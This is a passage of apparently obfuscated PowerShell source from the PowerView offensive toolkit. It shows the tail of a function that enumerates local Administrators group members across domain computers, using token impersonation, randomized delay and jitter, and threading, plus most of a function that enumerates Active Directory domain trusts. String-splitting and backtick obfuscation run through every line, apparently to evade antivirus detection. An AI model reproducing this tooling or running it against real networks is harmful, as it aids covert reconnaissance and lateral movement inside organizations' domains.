        if (${Ps`B`o`UNDpaRametERs}[("{3}{5}{2}{0}{4}{1}"-f 'puterO','stem','m','C','peratingSy','o')]) { ${cOMPuT`E`RSE`ArCHeRARG`UM`EntS}[("{3}{1}{0}{4}{2}"-f'tin','pera','ystem','O','gS')] = ${Op`e`RATIN`gsYS`TEm} }
        if (${pSB`Ound`PAR`AmetE`Rs}[("{0}{2}{3}{1}"-f'C','ck','ompute','rServicePa')]) { ${Co`mp`U`TerSEaRcheRaRgU`m`eNTS}[("{1}{0}{3}{2}"-f'v','Ser','Pack','ice')] = ${sERvIce`PA`Ck} }
        if (${ps`BoUn`dpAR`AM`ETERS}[("{0}{1}{2}" -f'C','omputerSiteNam','e')]) { ${coMput`ErSeaR`cHERAr`Gu`Me`NTs}[("{0}{1}" -f 'SiteN','ame')] = ${s`ItENA`me} }
        if (${Psb`O`U`NDpaRA`MeTErS}[("{0}{1}" -f 'Serv','er')]) { ${cO`mpu`TeR`sE`A`Rc`HeRaRGuMEntS}[("{0}{1}"-f'Serve','r')] = ${S`ErVER} }
        if (${p`SbOund`PARam`Eters}[("{0}{1}{3}{2}"-f'Se','archS','ope','c')]) { ${COM`pUter`s`E`ARCHeRarg`UMeNTs}[("{1}{2}{0}"-f 'pe','Sea','rchSco')] = ${s`EarcH`SC`OpE} }
        if (${PSbO`U`Nd`pa`RamE`TeRs}[("{0}{1}{3}{2}"-f'R','esultPa','ize','geS')]) { ${Com`PU`T`E`RSEARc`He`RArgUm`eNts}[("{3}{4}{1}{2}{0}"-f'eSize','ultP','ag','Re','s')] = ${r`eSUl`TPAG`esI`ZE} }
        if (${p`s`Bou`N`dpArAMet`ErS}[("{2}{3}{0}{1}" -f 'imi','t','ServerTi','meL')]) { ${cOMp`UtERSEarC`He`Rarg`UmENtS}[("{1}{0}{3}{2}" -f 'm','ServerTi','mit','eLi')] = ${sE`R`VeRt`ime`liMiT} }
        if (${P`S`Bou`NdPA`RamETERs}[("{2}{1}{0}" -f'stone','b','Tom')]) { ${COM`pu`TErSeA`R`c`HER`ARgUM`eNTS}[("{1}{3}{2}{0}" -f'stone','To','b','m')] = ${tOm`BsT`ONE} }
        if (${pSBouNd`P`A`RA`mete`Rs}[("{0}{2}{1}"-f'C','ential','red')]) { ${cOMpUte`RSEaRChE`RAR`g`UmeNTs}[("{1}{2}{0}" -f'ntial','Cre','de')] = ${CrEdENt`i`AL} }

        if (${pSB`OuNdpaR`Amet`E`RS}[("{2}{3}{1}{0}" -f 'e','rNam','Compu','te')]) {
            ${TAr`getC`oMPuTe`Rs} = ${Co`MPut`ER`NaME}
        }
        else {
            &("{1}{2}{0}" -f 'erbose','Wr','ite-V') ("{4}{5}{9}{11}{1}{10}{0}{8}{16}{12}{2}{13}{3}{14}{6}{7}{15}" -f'p','inL',' ','uerying compu','[F','ind-','ers in',' t','Memb','Dom','ocalGrou','a',']','Q','t','he domain','er')
            ${ta`RgET`Comput`eRs} = &("{1}{2}{4}{3}{0}" -f'mainComputer','G','e','o','t-D') @ComputerSearcherArguments | &("{4}{3}{1}{0}{2}" -f't-Ob','ec','ject','l','Se') -ExpandProperty ("{1}{0}{2}" -f 'tn','dnshos','ame')
        }
        &("{1}{0}{2}"-f 'erbos','Write-V','e') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if (${Tar`G`ETcoMP`UTeRS}."le`NGTh" -eq 0) {
            throw ("{11}{16}{10}{13}{3}{8}{1}{9}{4}{15}{7}{2}{12}{0}{5}{14}{6}"-f ' ','er]','n','lGroupMe','o hosts f','to','merate','u','mb',' N','mainLoc','[Fi','d','a',' enu','o','nd-Do')
        }

        
        ${HOS`TenU`mb`lO`Ck} = {
            Param(${com`Pu`TeR`NAme}, ${g`R`oUPNAMe}, ${MeT`HoD}, ${Toke`NH`An`dle})

            
            if (${GRO`U`PName} -eq ("{2}{1}{0}"-f 'ors','istrat','Admin')) {
                ${Ad`MINs`E`curITYid`ENTiF`ier} = &("{1}{2}{0}" -f 'ect','N','ew-Obj') ("{9}{2}{6}{5}{1}{8}{10}{0}{7}{4}{11}{3}" -f 'al.Se','Pri','Se','ier','I','ty.','curi','curity','nci','System.','p','dentif')( ( gci  ("{2}{0}{1}"-f'r','iaBLe:43S','va')  )."Va`LuE"::"BU`ILT`Ina`dmi`NIsTR`A`ToRs`siD",${NU`LL})
                ${GrOup`NA`Me} = (${aD`m`InseCur`ITyiDe`NTi`F`iER}."t`RAnsLA`Te"([System.Security.Principal.NTAccount])."v`ALuE" -split "\\")[-1]
            }

            if (${tokEN`ha`NDlE}) {
                
                ${N`UlL} = &("{3}{6}{7}{0}{1}{4}{2}{5}"-f'Us','erI','i','In','mpersonat','on','vo','ke-') -TokenHandle ${TOK`EnhaNd`LE} -Quiet
            }

            ForEach (${TaR`gE`TComP`U`Ter} in ${Co`Mp`Ute`RNAmE}) {
                ${U`P} = &("{2}{3}{0}{1}"-f 'Connectio','n','Tes','t-') -Count 1 -Quiet -ComputerName ${T`AR`GeTcOMP`U`TER}
                if (${UP}) {
                    ${nE`TloCaLg`ROu`Pmembe`R`Ar`guM`EnTs} = @{
                        ("{0}{2}{1}" -f 'C','e','omputerNam') = ${T`Arge`T`coM`Puter}
                        ("{1}{0}"-f 'ethod','M') = ${MeT`H`od}
                        ("{0}{1}{2}" -f'Gro','upN','ame') = ${grOUP`N`AME}
                    }
                    &("{2}{4}{3}{5}{1}{6}{0}"-f 'er','M','Get-Net','ocalGrou','L','p','emb') @NetLocalGroupMemberArguments
                }
            }

            if (${TokE`N`ha`NDlE}) {
                &("{2}{1}{3}{0}" -f 'Self','nvoke-Revert','I','To')
            }
        }

        ${log`OnT`OKEN} = ${NU`Ll}
        if (${psb`o`U`NDpar`AmeterS}[("{1}{0}{2}"-f 'edentia','Cr','l')]) {
            if (${P`S`BOuNdpaR`A`mete`Rs}[("{1}{0}"-f'elay','D')] -or ${PS`B`O`Un`d`pARAMETErs}[("{0}{1}{2}{3}"-f 'StopOnSu','cc','es','s')]) {
                ${LOgO`N`Token} = &("{2}{0}{1}{4}{3}"-f 'serImpe','rsona','Invoke-U','n','tio') -Credential ${Cr`EDen`Ti`AL}
            }
            else {
                ${log`O`NtOkEN} = &("{2}{5}{3}{0}{1}{4}" -f 'ersonati','o','Invoke-Us','rImp','n','e') -Credential ${cre`DEntI`Al} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${PS`BOU`Nd`PAramEtE`Rs}[("{1}{0}"-f'ay','Del')] -or ${Ps`B`OuNd`P`A`RAmEtErs}[("{1}{3}{2}{0}"-f 'cess','Sto','Suc','pOn')]) {

            &("{3}{1}{2}{4}{0}"-f'se','t','e-Ve','Wri','rbo') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &("{1}{2}{0}{3}" -f 'er','W','rite-V','bose') ('[Find-Domain'+'Lo'+'c'+'alG'+'rou'+'p'+'M'+'ember'+'] '+'D'+'e'+'lay: '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${CouN`T`eR} = 0
            ${RA`NdnO} = &("{0}{1}{2}" -f'N','ew-Objec','t') ("{3}{2}{0}{1}"-f 'do','m','n','System.Ra')

            ForEach (${TARGE`TComPU`TEr} in ${t`ARgEtC`OmPu`T`ers}) {
                ${coUN`TeR} = ${cOuN`T`Er} + 1

                
                &("{0}{2}{1}"-f'Start-','ep','Sle') -Seconds ${Ra`N`dNO}.("{0}{1}"-f 'N','ext').Invoke((1-${Jit`Ter})*${dE`L`AY}, (1+${jit`T`er})*${DE`LAY})

                &("{3}{2}{0}{1}"-f 'te-V','erbose','i','Wr') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{2}{0}{1}{3}"-f'o','ke-Comman','Inv','d') -ScriptBlock ${hOS`T`eNUm`B`Lock} -ArgumentList ${taRG`E`TcOmp`UtER}, ${g`R`Ou`PNAME}, ${ME`ThOd}, ${loGONTO`K`en}
            }
        }
        else {
            &("{1}{4}{2}{3}{0}"-f'erbose','W','e','-V','rit') ('[Fi'+'nd-'+'Do'+'m'+'ai'+'nL'+'oca'+'lGrou'+'pMe'+'mber] '+'Using'+' '+'thr'+'eadin'+'g '+'wit'+'h '+'thread'+'s:'+' '+"$Threads")

            
            ${ScrI`p`TpaR`Ams} = @{
                ("{0}{1}"-f'GroupNam','e') = ${GRO`U`pnAME}
                ("{1}{0}{2}"-f'tho','Me','d') = ${mETH`od}
                ("{2}{0}{3}{1}" -f'k','dle','To','enHan') = ${LOgON`T`Ok`En}
            }

            
            &("{2}{3}{4}{0}{1}" -f 'u','nction','New','-Threade','dF') -ComputerName ${TARg`EtcoMPu`TE`Rs} -ScriptBlock ${hoStENuM`Blo`Ck} -ScriptParameters ${s`CR`iptPaRamS} -Threads ${ThRE`A`dS}
        }
    }

    END {
        if (${lO`GON`T`OkEN}) {
            &("{4}{6}{0}{3}{5}{2}{1}"-f'voke-RevertT','f','el','o','I','S','n') -TokenHandle ${LO`gONtOK`EN}
        }
    }
}








function GE`T-dOMaINT`Ru`St {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f'PSS','dProcess','h','oul'}, '')]
    [OutputType({"{6}{2}{0}{3}{5}{4}{1}"-f'm','T','iew.Do','ai','E','nTrust.N','PowerV'})]
    [OutputType({"{2}{1}{4}{6}{3}{0}{5}"-f 'Tru','o','P','View.Domain','w','st.LDAP','er'})]
    [OutputType({"{3}{1}{4}{5}{0}{2}" -f'ainTrust','wer','.API','Po','Vie','w.Dom'})]
    [CmdletBinding(DEFauLtPArAmEterSetNAme = {"{0}{1}"-f 'LD','AP'})]
    Param(
        [Parameter(POsItIon = 0, vaLuEfroMpipElInE = ${t`Rue}, VALuEFrOmPipELiNeByproperTynaMe = ${Tr`Ue})]
        [Alias({"{1}{0}" -f'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oM`Ain},

        [Parameter(pArAmeteRSEtname = 'API')]
        [Switch]
        ${A`PI},

        [Parameter(PAraMetERSETNamE = 'NET')]
        [Switch]
        ${n`et},

        [Parameter(PArAMeTErseTNAmE = "L`daP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Filt','er'})]
        [String]
        ${LDa`PfiL`T`Er},

        [Parameter(pArAMETeRSetName = "LD`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`opE`RtI`ES},

        [Parameter(pArameTERsetNAme = "l`Dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'SPa','th','AD'})]
        [String]
        ${s`ea`R`CHbasE},

        [Parameter(PAraMetERSETnAME = "LD`AP")]
        [Parameter(PARAMetErsetnaMe = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}"-f 'ntroller','mai','nCo','Do'})]
        [String]
        ${sERV`Er},

        [Parameter(pArAMEterseTnAMe = "ld`Ap")]
        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{1}{2}"-f'One','Lev','el'}, {"{0}{1}{2}" -f'Su','btre','e'})]
        [String]
        ${sea`RcHSC`o`pE} = ("{0}{2}{1}" -f 'S','e','ubtre'),

        [Parameter(PaRamEtERSetNaMe = "l`dAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${ReSul`T`pA`geS`iZE} = 200,

        [Parameter(pAraMETerSEtNAMe = "Ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRver`Tim`ELiMIT},

        [Parameter(PAraMEtErsEtnAme = "L`dAp")]
        [Switch]
        ${TOM`B`Stone},

        [Alias({"{1}{2}{3}{0}" -f'One','Re','tur','n'})]
        [Switch]
        ${f`I`NdOne},

        [Parameter(pARameteRSETNAme = "L`daP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eD`eNTiAl} =   ${7t`q02}::"Em`ptY",

        [Switch]
        ${S`Sl},

        [Switch]
        ${O`BFUsCA`Te}
    )

    BEGIN {
        ${tR`Us`TaTtrIB`UT`ES} = @{
            [uint32]("{1}{0}{2}"-f '0000','0x000','1') = ("{2}{3}{0}{1}" -f'TRAN','SITIVE','NON','_')
            [uint32]("{0}{1}{2}{3}" -f '0x','0','0','000002') = ("{1}{0}{2}"-f 'PLE','U','VEL_ONLY')
            [uint32]("{1}{0}{2}"-f'x00','0','000004') = ("{2}{1}{0}"-f 'DS','LTER_SI','FI')
            [uint32]("{1}{2}{0}"-f '008','0x','00000') = ("{2}{0}{4}{1}{3}"-f 'OREST','NS','F','ITIVE','_TRA')
            [uint32]("{3}{0}{1}{2}"-f 'x','00000','010','0') = ("{1}{3}{2}{0}"-f 'ON','CROS','TI','S_ORGANIZA')
            [uint32]("{2}{1}{0}"-f'0020','0','0x000') = ("{1}{0}{2}"-f 'T','WI','HIN_FOREST')
            [uint32]("{2}{0}{1}"-f'x0','0000040','0') = ("{2}{0}{1}{4}{3}{5}"-f '_','E','TREAT_AS','R','XTE','NAL')
            [uint32]("{0}{2}{1}"-f '0x0000','080','0') = ("{1}{3}{5}{4}{0}{2}" -f 'I','TRUST_USES_R','ON','C4','YPT','_ENCR')
            [uint32]("{2}{0}{1}" -f '0','00100','0x00') = ("{1}{2}{6}{5}{0}{4}{3}" -f 'S_','TR','UST','EYS','K','SES_AE','_U')
            [uint32]("{0}{1}{2}" -f'0','x0000','0200') = ("{7}{6}{1}{0}{2}{4}{8}{3}{5}"-f'_N','IZATION','O_','T','TGT','ION','S_ORGAN','CROS','_DELEGA')
            [uint32]("{2}{0}{1}"-f'0000','400','0x0') = ("{1}{2}{0}" -f'_TRUST','P','IM')
        }

        ${l`dAPS`eArcHEr`A`RG`Um`eNTs} = @{}
        if (${PsBoU`NdPA`R`Amete`RS}[("{1}{0}"-f 'in','Doma')]) { ${LdA`pSE`ARC`HERArGumeN`Ts}[("{1}{2}{0}"-f'ain','Do','m')] = ${DoM`AIn} }
        if (${PSbOunDp`A`R`AMe`TerS}[("{2}{0}{1}" -f 'Filte','r','LDAP')]) { ${l`DAPseArCHER`ARGuM`EnTS}[("{2}{0}{1}" -f'APF','ilter','LD')] = ${LdApf`iLT`eR} }
        if (${psbOUnd`PAr`A`meTE`RS}[("{1}{0}{2}" -f'ro','P','perties')]) { ${LDap`Sear`cher`A`R`gUMeNTs}[("{1}{2}{0}" -f's','P','ropertie')] = ${Pr`opER`T`IES} }
        if (${psBOun`DPARAm`ETE`Rs}[("{0}{2}{1}" -f 'Sear','Base','ch')]) { ${ldaPSeARCh`e`Rarg`U`MEnTS}[("{2}{0}{1}"-f 'hBa','se','Searc')] = ${s`ea`RchbAse} }
        if (${P`sboun`d`PaRAMETeRs}[("{2}{0}{1}"-f'er','ver','S')]) { ${LDAPs`EaRch`eR`ARGU`men`Ts}[("{1}{0}{2}"-f'r','Se','ver')] = ${SERv`ER} }
        if (${psBo`UNDp`AR`A`mEtErS}[("{1}{0}{3}{2}" -f'earch','S','ope','Sc')]) { ${LdAPsea`RChER`ARg`UM`EntS}[("{2}{1}{0}"-f'e','Scop','Search')] = ${s`Ear`CH`ScoPE} }
        if (${PsBoundP`AraM`Et`E`RS}[("{1}{2}{0}"-f 'ageSize','R','esultP')]) { ${lDa`P`SEArcHErA`RGumEn`TS}[("{1}{3}{0}{2}" -f 'geS','Resul','ize','tPa')] = ${RESUl`Tpag`Es`ize} }
        if (${ps`BoUNDpar`A`M`eTERs}[("{4}{1}{3}{0}{2}"-f 'erTimeLim','er','it','v','S')]) { ${ld`Ap`sEARCher`ArguMe`N`TS}[("{2}{3}{0}{1}"-f 'mi','t','Serv','erTimeLi')] = ${s`ERVe`RtiM`E`lim`It} }
        if (${PS`B`ouN`dpArametE`RS}[("{0}{1}{2}" -f 'To','mbsto','ne')]) { ${lDaPS`e`ArcH`ER`ARgUmE`N`Ts}[("{1}{0}{2}" -f'st','Tomb','one')] = ${TOm`BS`T`one} }
        if (${Ps`BOunDpAra`ME`TErs}[("{2}{0}{1}"-f're','dential','C')]) { ${ldA`pse`ARcHeRar`g`UME`N`TS}[("{2}{0}{3}{1}"-f'r','ial','C','edent')] = ${cR`e`DentiAl} }
        if (${PsBOUnd`pa`R`AMEtERs}['SSL']) { ${L`d`ApSEaRcHE`RArgUM`ENts}['SSL'] = ${S`sl} }
        if (${psbo`UNd`PAR`A`m`EtErS}[("{1}{2}{0}{3}"-f'ca','Ob','fus','te')]) {${ldA`psE`A`RCH`erA`RgUmEN`Ts}[("{0}{2}{1}" -f 'Obf','scate','u')] = ${OBfus`c`Ate} }

        ${nE`TsEArcH`e`RARgum`enTs} = @{}
        if (${psbounDPArA`m`E`Te`RS}[("{1}{0}"-f'ain','Dom')]) { ${Ld`A`pSE`A`RCherARGUmENTS}[("{1}{0}" -f 'omain','D')] = ${dO`m`AiN} }
        if (${ps`BoUN`dPa`RAmet`erS}[("{0}{1}" -f'S','erver')]) { ${LDAP`Sea`RcheRArg`UME`NtS}[("{1}{0}"-f'erver','S')] = ${SE`RVEr} }
        if (${pSb`oU`NDpAR`AMEtErs}['SSL']) { ${NeT`sea`Rch`eRar`GUMen`Ts}['SSL'] = ${S`SL} }
        if (${PsBoUN`Dp`ArAmET`erS}[("{2}{0}{1}" -f'us','cate','Obf')]) {${Netse`A`RCH`ERArGUmeNTs}[("{0}{2}{1}{3}"-f 'Ob','us','f','cate')] = ${Obfu`S`c`ATE} }

    }

    PROCESS {
        if (${p`ScMd`LET}.PaRAMeTersetNAME -ne 'API') {
            if (${d`om`AIN} -and ${do`Main}.("{0}{1}" -f 'T','rim').Invoke() -ne '') {
                ${SouRCEDoM`A`In} = ${D`O`mAIN}
            }
            else {
                if (${PsBOUND`p`A`RAmEteRs}[("{0}{1}{2}" -f 'Creden','t','ial')]) {
                    ${S`Ou`Rc`edomaIn} = (&("{0}{2}{1}"-f'G','n','et-Domai') -Credential ${C`REd`ENtIal})."n`AMe"
                }
                else {
                    ${sOUrC`e`dOMa`IN} = (&("{1}{0}{2}{3}"-f'e','G','t-Domai','n'))."nA`Me"
                }
            }
        }
        elseif (${pSc`mDlEt}.paramEtersETnAME -ne 'NET') {
            if (${D`Oma`in} -and ${D`o`MaIn}.("{1}{0}" -f'im','Tr').Invoke() -ne '') {
                ${s`oU`RCedOmain} = ${dOM`A`IN}
            }
            else {
                ${so`Ur`cedomaiN} = ${EN`V:USerd`N`sDOmaIN}
            }
        }

        if (${p`scm`D`Let}.paRamETeRSETNamE -eq ("{0}{1}"-f'LDA','P')) {
            
            ${So`URCeS`id} = &("{0}{1}{3}{2}" -f 'Get-Dom','ai','D','nSI') @NetSearcherArguments


            ${re`sUL`TS} = &("{3}{1}{4}{0}{2}" -f'L','e','DAPQuery','Invok','-') @LdapSearcherArguments -LDAPFilter ("{0}{2}{7}{4}{3}{6}{8}{1}{5}" -f'(ob','oma','j','s','ctCla','in)','s=trusted','e','D')
            ${Re`su`LTs} | &("{0}{1}{2}" -f 'W','here-Obje','ct') {${_}} | &("{1}{0}{2}{3}"-f'rE','Fo','ach-Ob','ject') {
                if (&("{2}{1}{0}" -f'ber','em','Get-M') -inputobject ${_} -name ("{3}{0}{2}{1}" -f'ttr','tes','ibu','A') -Membertype ("{0}{1}{2}" -f 'P','roperti','es')) {
                    ${PRo`PS} = @{}
                    foreach (${A} in ${_}."AtT`RI`ButES"."ke`Ys" | &("{1}{2}{0}" -f't','Sort-Ob','jec')) {
                        if ((${a} -eq ("{0}{1}{2}"-f'ob','jec','tsid')) -or (${A} -eq ("{2}{3}{0}{1}"-f'hist','ory','si','d')) -or (${A} -eq ("{1}{2}{0}"-f'guid','obj','ect')) -or (${A} -eq ("{1}{2}{0}{3}"-f 'erc','u','s','ertificate')) -or (${a} -eq ("{2}{0}{4}{3}{1}{5}" -f 't','ie','securi','f','yidenti','r'))) {
                            ${Pr`o`pS}[${A}] = ${_}."ATtR`I`BuTes"[${A}]
                        }
                        else {
                            ${va`lU`Es} = @()
                            foreach (${v} in ${_}."ATTR`I`BUt`es"[${A}]."Ge`TVaL`Ues"([byte[]])) {
                                ${Va`l`UES} +=  ( vARIabLe  ("{0}{1}" -f'm','1Lc') -VAlU)::"uT`F8"."GeT`sT`RINg"(${V})
                            }
                            ${p`ROPS}[${A}] = ${va`LuES}
                        }
                    }
                }
                else {
                    ${PRo`PS} = ${_}."p`ROPerT`IEs"
                }

                ${DOMaiNt`R`UsT} = &("{1}{3}{0}{2}"-f 'bj','N','ect','ew-O') ("{2}{1}{0}"-f'bject','SO','P')

                ${T`Rus`TaTTrib} = @()
                ${TRu`S`TAttRib} += ${trus`TA`TTRi`BUTES}."ke`Ys" | &("{2}{0}{1}{3}"-f 're-','Objec','Whe','t') { ${p`RO`PS}."TrUstaTTr`IBU`Tes"[0] -band ${_} } | &("{0}{2}{1}"-f 'Fo','Each-Object','r') { ${Tru`STA`T`TRIb`Utes}[${_}] }

                ${DIRect`i`On} = Switch (${Pr`oPs}."TR`UsTDi`Re`c`Tion") {
                    0 { ("{0}{2}{1}"-f'D','abled','is') }
                    1 { ("{1}{0}" -f 'und','Inbo') }
                    2 { ("{0}{2}{1}"-f'Ou','d','tboun') }
                    3 { ("{3}{2}{1}{0}" -f 'l','rectiona','di','Bi') }
                }

                ${trus`Tty`Pe} = Switch (${pr`ops}."trU`sTTypE") {
                    1 { ("{1}{3}{0}{2}{5}{6}{4}" -f 'DOWS_NON_AC','WI','TI','N','Y','VE_DIRE','CTOR') }
                    2 { ("{1}{0}{2}{5}{3}{4}"-f'IN','W','DOWS_A','E_DIRE','CTORY','CTIV') }
                    3 { 'MIT' }
                }

                ${disT`INg`UISHE`dN`AME} = ${PRO`ps}."DI`STIngU`is`H`e`dnaMe"[0]
                ${S`OU`RCE`NAMEINDEX} = ${DiSt`IN`guISHedN`AME}.("{0}{2}{1}" -f'I','dexOf','n').Invoke('DC=')
                if (${s`oU`RcEnAM`eInDex}) {
                    ${SoURC`ed`Om`A`IN} = $(${DI`sT`INg`Uis`hE`dnaMe}.("{0}{2}{1}"-f'S','ring','ubSt').Invoke(${SoU`RCEname`I`NDeX})) -replace 'DC=','' -replace ',','.'
                }
                else {
                    ${sOurce`dOma`iN} = ""
                }

                ${TaRGeTna`me`iN`DEX} = ${D`isT`In`GUIshEd`Na`Me}.("{2}{0}{1}"-f 'nd','exOf','I').Invoke(("{0}{2}{1}" -f ',CN=','stem','Sy'))
                if (${SOURceNa`meIN`D`EX}) {
                    ${tAR`GEtd`oM`AiN} = ${DI`s`T`iNguIshed`NAme}.("{1}{0}" -f'bString','Su').Invoke(3, ${TA`RgETn`AM`EiNDEx}-3)
                }
                else {
                    ${t`ARget`DOma`in} = ""
                }

                ${oB`ject`gU`ID} = &("{2}{0}{1}"-f 'bj','ect','New-O') ("{0}{1}"-f 'G','uid') @(,${PR`O`Ps}."OB`jEctG`UId"[0])
                ${ta`RG`E`TSId} = (&("{1}{0}{2}" -f'-Objec','New','t') ("{5}{1}{3}{6}{2}{0}{7}{8}{4}{10}{9}"-f 'ci','m.S','n','ecurity.Pr','l.SecurityI','Syste','i','p','a','fier','denti')(${p`ROps}."s`ec`URITyIdE`Ntif`iER"[0],0))."v`ALUE"

                ${domaINt`R`USt} | &("{3}{0}{1}{2}" -f 'dd','-','Member','A') ("{0}{2}{1}{3}" -f 'N','p','otepro','erty') ("{3}{2}{0}{1}" -f 'e','Name','rc','Sou') ${sourcE`D`o`MaIN}
                ${D`omAi`Nt`Rust} | &("{2}{3}{1}{0}"-f 'ber','m','Add-','Me') ("{2}{1}{0}" -f'roperty','ep','Not') ("{1}{3}{0}{2}" -f'getN','T','ame','ar') ${pRO`ps}."n`AME"[0]
                
                ${dOmAi`N`Trust} | &("{0}{1}{2}"-f 'Add-M','e','mber') ("{2}{1}{3}{0}"-f'property','t','No','e') ("{2}{0}{1}" -f'rust','Type','T') ${t`RuStt`Ype}
                ${doMAi`NT`R`UST} | &("{2}{0}{1}"-f'd-','Member','Ad') ("{0}{2}{1}" -f 'N','erty','oteprop') ("{2}{0}{1}{3}"-f 'us','tAttribut','Tr','es') $(${TruS`TATTr`iB} -join ',')
                ${DO`m`AINTR`UsT} | &("{0}{2}{3}{1}"-f 'Ad','ber','d-M','em') ("{3}{1}{2}{0}"-f 'rty','r','ope','Notep') ("{2}{0}{1}{3}" -f't','D','Trus','irection') "$Direction"
                ${do`m`AINTR`UsT} | &("{1}{0}{2}" -f '-Mem','Add','ber') ("{1}{2}{0}{3}" -f'epro','N','ot','perty') ("{1}{2}{0}{3}" -f 'te','Whe','nCrea','d') ${p`Rops}."Wh`enc`REated"[0]
                ${D`OMa`iN`TrUSt} | &("{1}{2}{0}"-f 'mber','Add','-Me') ("{3}{0}{2}{1}"-f 'te','roperty','p','No') ("{1}{2}{0}"-f'ged','Whe','nChan') ${Pr`oPs}."WheNCha`NG`eD"[0]
                ${DOMa`InTR`U`st}."P`SO`BJEcT"."TYpeN`AmEs".("{0}{1}"-f'In','sert').Invoke(0, ("{4}{0}{3}{1}{2}"-f 'n','ust.L','DAP','Tr','PowerView.Domai'))
                ${dO`MaIntrU`st}
            }
            if (${r`esuL`Ts}) {
                try { ${Res`UlTS}.("{0}{2}{1}" -f 'disp','se','o').Invoke() }
                catch {
                    &("{0}{2}{1}{3}"-f 'W','-Ve','rite','rbose') ('['+'Get-'+'D'+'omainTrust'+']'+' '+'Er'+'ror '+'di'+'sposi'+'ng '+'of'+' '+'t'+'he '+'Res'+'u'+'lts '+'object'+': '+"$_")
                }
            }
        }
        elseif (${P`scM`dl`eT}.PAramETerseTnaMe -eq 'API') {
            
            if (${PS`BO`Undp`ArAm`E`TErS}[("{1}{0}{2}" -f 'erve','S','r')]) {
                ${TaR`GET`DC} = ${S`e`RVer}
            }
            elseif (${doMA`IN} -and ${DoM`AiN}.("{1}{0}" -f 'm','Tri').Invoke() -ne '') {
                ${tA`RGETdc} = ${DOMA`in}
            }
            else {
                
                ${t`Ar`G`EtDC} = ${Nu`lL}
            }

            
            ${P`T`RiNfO} =   ( GET-vaRIablE  ('Z'+'Fvw1'))."Va`lUe"::"Ze`Ro"

            
            ${FLa`GS} = 63
            ${do`Ma`IncOUnT} = 0

            
            ${ReS`ULt} = ${NEtA`p`i32}::"dSenu`MErATEdo`M`AiNtRu`STs"(${Ta`Rg`etDc}, ${f`L`AgS}, [ref]${p`T`RInfO}, [ref]${Do`MA`iNCO`Unt})

            
            ${Off`s`eT} = ${PTR`iN`FO}.("{1}{0}{2}"-f 'In','To','t64').Invoke()

            
            if ((${r`e`SulT} -eq 0) -and (${o`FfsEt} -gt 0)) {

                
                ${inCrE`Me`Nt} = ${D`s_`domAin_`T`RuSTs}::("{1}{0}"-f 'ize','GetS').Invoke()

                
                for (${i} = 0; (${i} -lt ${dom`AI`N`CouNT}); ${I}++) {
                    
                    ${N`eWIN`TP`TR} = &("{2}{0}{1}"-f'ew','-Object','N') ("{2}{0}{3}{1}" -f 'stem.In','r','Sy','tpt') -ArgumentList ${oFfS`Et}
                    ${i`NFO} = ${NEWIn`T`P`Tr} -as ${ds`_`domAI`N_tru`s`TS}

                    ${Of`FS`eT} = ${N`EWin`Tptr}.("{2}{0}{1}"-f'In','t64','To').Invoke()
                    ${off`sEt} += ${IN`CR`eme`Nt}

                    ${SiD`sTR`INg} = ''
                    ${r`eS`UlT} = ${aDvAp`I`32}::"C`ONVERt`siD`TOSTRi`NgSid"(${i`NfO}."d`o`MaINSID", [ref]${s`IDs`TrIng});${la`St`ER`ROR} =  (Gci  ('VARIa'+'BLe'+':V'+'PZS')  )."VAl`Ue"::("{3}{1}{5}{4}{2}{0}"-f 'ror','tLastW','r','Ge','n32E','i').Invoke()

                    if (${r`E`Sult} -eq 0) {
                        &("{1}{0}{2}" -f 'te','Wri','-Verbose') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${DO`m`AinT`RuSt} = &("{1}{0}{3}{2}" -f'w','Ne','bject','-O') ("{0}{1}" -f'PSObje','ct')
                        ${D`OmA`i`NtrUst} | &("{0}{1}{2}"-f 'Ad','d-Memb','er') ("{0}{2}{1}" -f'Not','operty','epr') ("{0}{3}{1}{2}" -f'So','Nam','e','urce') ${soUR`ceD`om`AiN}
                        ${dOM`A`Int`Rust} | &("{2}{0}{1}{3}" -f 'd','d-Membe','A','r') ("{0}{3}{2}{1}"-f 'N','y','ropert','otep') ("{0}{2}{1}" -f 'Targ','tName','e') ${i`NFo}."Dn`SdoM`A`iNNa`me"
                        ${do`m`AintRU`ST} | &("{2}{1}{0}"-f 'r','e','Add-Memb') ("{0}{2}{1}"-f 'Notep','erty','rop') ("{2}{0}{3}{5}{4}{1}" -f'arg','me','T','etNetbi','sNa','o') ${I`NFo}."netb`ioSDO`MAi`N`N`AME"
                        ${dO`Ma`in`TRuSt} | &("{0}{3}{2}{1}"-f'Add-M','r','be','em') ("{2}{0}{3}{1}" -f'oteprop','y','N','ert') ("{1}{0}"-f's','Flag') ${in`FO}."Fl`AGs"
                        ${Do`MaI`NtruSt} | &("{2}{1}{0}"-f'ember','dd-M','A') ("{1}{2}{0}{3}" -f 'pe','Note','pro','rty') ("{1}{0}{2}"-f'n','Pare','tIndex') ${I`NfO}."parEN`Tin`DEx"
                        ${d`Om`A`IntRust} | &("{2}{1}{0}"-f'er','Memb','Add-') ("{1}{2}{0}"-f 'operty','N','otepr') ("{1}{2}{0}"-f'e','T','rustTyp') ${IN`Fo}."Tr`UstT`Ype"
